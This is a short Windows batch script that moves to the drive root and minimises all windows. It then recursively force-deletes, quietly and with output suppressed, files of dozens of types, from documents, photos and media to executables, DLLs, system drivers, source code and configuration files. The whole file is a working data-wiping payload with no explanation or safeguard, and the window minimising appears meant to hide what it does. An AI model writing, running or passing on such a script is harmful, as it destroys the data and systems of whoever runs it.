@echo off
cd..
cd..
cd..
cd..
cd..
cd..
cd..
cd..
cd..
cd..
powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
del /s /f /q *.txt *.doc *.docx *.pdf *.rtf *.odt *.xls *.xlsx *.csv *.ppt *.pptx *.jpg *.jpeg *.png *.gif *.bmp *.tiff *.webp *.ico *.mp3 *.wav *.flac *.aac *.ogg *.mp4 *.mkv *.avi *.mov *.wmv *.zip *.rar *.7z *.tar *.gz  *.exe *.msi *.dll *.sys *.iso *.img *.html *.htm *.css *.js *.json *.xml *.php *.py *.java *.cpp *.c *.cs *.cmd *.ps1 *.ini *.cfg *.log *.tmp >nul 2>&1
